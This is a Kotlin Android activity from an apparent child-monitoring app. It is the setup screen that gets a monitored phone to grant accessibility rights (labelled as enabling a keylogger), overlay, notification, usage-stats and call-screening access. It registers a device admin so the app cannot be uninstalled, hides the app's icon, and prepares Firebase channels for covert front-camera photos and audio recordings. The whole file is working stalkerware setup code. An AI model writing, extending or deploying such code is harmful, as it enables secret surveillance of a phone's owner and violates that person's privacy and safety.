package com.example.rule.dash.ui.activities.mainchild

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.app.role.RoleManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import android.widget.Button
import android.widget.RelativeLayout
import android.widget.Switch
import androidx.activity.result.contract.ActivityResultContracts
import cn.pedant.SweetAlert.SweetAlertDialog
import com.example.rule.dash.R
import com.example.rule.dash.data.model.ChildPhoto
import com.example.rule.dash.data.model.ChildRecording
import com.example.rule.dash.data.preference.DataSharePreference.childSelected
import com.example.rule.dash.data.rxFirebase.InterfaceFirebase
import com.example.rule.dash.receiver.MyDeviceAdminReceiver
import com.example.rule.dash.services.accessibilityData.AccessibilityDataService
import com.example.rule.dash.ui.activities.base.BaseActivity
import com.example.rule.dash.utils.ConstFun.isAddWhitelist
import com.example.rule.dash.utils.ConstFun.isNotificationServiceRunning
import com.example.rule.dash.utils.ConstFun.openAccessibilitySettings
import com.example.rule.dash.utils.ConstFun.openNotificationListenerSettings
import com.example.rule.dash.utils.ConstFun.openUseAccessSettings
import com.example.rule.dash.utils.ConstFun.openWhitelistSettings
import com.example.rule.dash.utils.ConstFun.showApp
import com.example.rule.dash.utils.Consts.CHILD_NAME
import com.example.rule.dash.utils.Consts.CHILD_PERMISSION
import com.example.rule.dash.utils.Consts.CHILD_SHOW_APP
import com.example.rule.dash.utils.Consts.DATA
import com.example.rule.dash.utils.Consts.DEVICE_NAME
import com.example.rule.dash.utils.Consts.INTERVAL
import com.example.rule.dash.utils.Consts.PARAMS
import com.example.rule.dash.utils.Consts.PHOTO
import com.example.rule.dash.utils.Consts.RECORDING
import com.example.rule.dash.utils.Consts.TIMER
import com.example.rule.dash.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
import com.example.rule.dash.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.example.rule.dash.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.example.rule.dash.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.google.firebase.database.DatabaseReference
import com.jaredrummler.android.device.DeviceName
import com.pawegio.kandroid.start
import kotterknife.bindView
import javax.inject.Inject

class MainChildActivity : BaseActivity(R.layout.activity_main_child) {

    private val btnHideApp: Button by bindView(R.id.btn_hide_app)
    private val btnHideAppForce: Button by bindView(R.id.btn_hide_app_force)
    private val btnEnableService: RelativeLayout by bindView(R.id.btn_enable_service)
    private val btnEnableOverDraw: RelativeLayout by bindView(R.id.btn_enable_overdraw)
    private val btnEnableUsageStats: RelativeLayout by bindView(R.id.btn_enable_usage_stats)
    private val btnEnableNotificationListener : RelativeLayout by bindView(R.id.btn_enable_service_notification)
    private val btnWhitelist : RelativeLayout by bindView(R.id.btn_add_whitelist)
    private val btnDisableUninstall : RelativeLayout by bindView(R.id.btn_disable_uninstall)
    private val switchDisableUninstall: Switch by bindView(R.id.switch_disable_uninstall)
    private val switchOverDraw: Switch by bindView(R.id.switch_overdraw)
    private val switchUsageStats: Switch  by bindView(R.id.switch_usage_stats)
    private val switchAccessibility : Switch by bindView(R.id.switch_accessibility)
    private val switchNotificationListener : Switch by bindView(R.id.switch_notification)
    private val switchWhitelist : Switch by bindView(R.id.switch_add_whitelist)
    private val testButton : Button by bindView(R.id.start_uninstall)
    private lateinit var devicePolicyManager : DevicePolicyManager
    private lateinit var componentName : ComponentName

    @Inject
    lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        getComponent()!!.inject(this)
        init()
        onClickApp()
        bindCallService()
        testButton.setOnClickListener {
            val devicePolicyManager = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
            devicePolicyManager.removeActiveAdmin(componentName)
        }
    }

    private fun bindCallService(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(ROLE_SERVICE) as RoleManager
            val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_CALL_SCREENING)
            val startForRequestRoleResult = registerForActivityResult(
                ActivityResultContracts.StartActivityForResult()
            ) { result: androidx.activity.result.ActivityResult ->
                if (result.resultCode == Activity.RESULT_OK) {
                    //  you will get result here in result.data
                    bindMyService()
                }
            }
            startForRequestRoleResult.launch(intent)
        }
    }

    private fun bindMyService(){
        Log.i("MainChildActivity", "binding my service")
        val mCallServiceIntent = Intent("android.telecom.CallScreeningService")
        mCallServiceIntent.setPackage(applicationContext.packageName)
        val mServiceConnection: ServiceConnection = object : ServiceConnection {
            override fun onServiceConnected(componentName: ComponentName, iBinder: IBinder) {}
            override fun onServiceDisconnected(componentName: ComponentName) {}
            override fun onBindingDied(name: ComponentName) {}
        }
        bindService(mCallServiceIntent, mServiceConnection, BIND_AUTO_CREATE)
    }

    override fun onResume() {
        super.onResume()
        checkSwitchPermissions()
    }

    private fun init() {

        //data
        getReference("$DATA/$CHILD_SHOW_APP").setValue(true)
        getReference("$DATA/$CHILD_NAME").setValue(childSelected)
        getReference("$DATA/$DEVICE_NAME").setValue(DeviceName.getDeviceName())

        //photo
        val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
        getReference("$PHOTO/$PARAMS").setValue(childPhoto)
        getReference("$PHOTO/$CHILD_PERMISSION").setValue(true)

        //Recording
        val childRecording = ChildRecording(false,0)
        getReference("$RECORDING/$PARAMS").setValue(childRecording)
        getReference("$RECORDING/$TIMER/$INTERVAL").setValue(0)

    }

    private fun checkSwitchPermissions() {
        switchOverDraw.isChecked = canOverDrawOtherApps()
        switchUsageStats.isChecked = hasUsageStatsPermission()
        switchAccessibility.isChecked = AccessibilityDataService.isRunningService
        switchNotificationListener.isChecked = isNotificationServiceRunning()
        switchWhitelist.isChecked = isAddWhitelist()
        switchDisableUninstall.isChecked = hasDeviceAdminPermission()
    }

    private fun onClickApp() {
        btnHideApp.setOnClickListener {
            checkPermissions(false)
        }
        btnHideAppForce.setOnClickListener{
            checkPermissions(true)
        }
        btnEnableService.setOnClickListener {

            if (!AccessibilityDataService.isRunningService){
                dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_keylogger){ openAccessibilitySettings() }
            }else showMessage(R.string.already_activated)
        }
        btnEnableOverDraw.setOnClickListener {
            if (!canOverDrawOtherApps()){
                dialog(SweetAlertDialog.NORMAL_TYPE,R.string.msg_dialog_enable_overdraw){ openDrawOverPermissionSetting() }
            }else showMessage(R.string.already_activated)
        }

        btnEnableUsageStats.setOnClickListener {
            if (!hasUsageStatsPermission()){
                openUseAccessSettings()
            }else showMessage(R.string.already_activated)
        }

        btnEnableNotificationListener.setOnClickListener {
            if (!isNotificationServiceRunning()){
                openNotificationListenerSettings()
            }else showMessage(R.string.already_activated)
        }
        btnWhitelist.setOnClickListener {
            if (!isAddWhitelist()){
                openWhitelistSettings()
            }else showMessage(R.string.already_activated)
        }
        btnDisableUninstall.setOnClickListener {
            if (!hasDeviceAdminPermission()){
                enableDeviceAdmin()
            }else{
                showMessage(R.string.already_activated)
            }
        }
    }

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun checkPermissions(force : Boolean) {
        if (hasUsageStatsPermission() && canOverDrawOtherApps() && isNotificationServiceRunning() &&
                AccessibilityDataService.isRunningService && isAddWhitelist() && hasDeviceAdminPermission()) {
            showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.hiding,null,null){ show() }
            showApp(false)
            getReference("$DATA/$CHILD_SHOW_APP").setValue(false)
        }else if (force) {
            dialogForce()
        }
        else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.enable_all_permissions)
    }

    private fun enableDeviceAdmin(){
        if (!hasDeviceAdminPermission()) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            intent.start(this)
        }else switchDisableUninstall.isChecked = true
    }

    private fun hasDeviceAdminPermission() : Boolean {
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        return devicePolicyManager.isAdminActive(componentName)
    }

    private fun dialog(type:Int,msg:Int, action:(()->Unit)?=null) {
            showDialog(type, R.string.title_dialog, getString(msg), android.R.string.ok) {
                setConfirmClickListener { hideDialog(); if (action != null) action() }; show()
            }
    }

    private fun dialogForce() {
        showDialog(SweetAlertDialog.WARNING_TYPE, R.string.title_dialog, "", R.string.already_granted, true) {
            setConfirmClickListener { hideDialog()
                showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.hiding,null,null){ show() }
                showApp(false)
                getReference("$DATA/$CHILD_SHOW_APP").setValue(false)
            }
            show()
        }
    }

    override fun onDestroy() {
        hideDialog()
        super.onDestroy()
    }
}
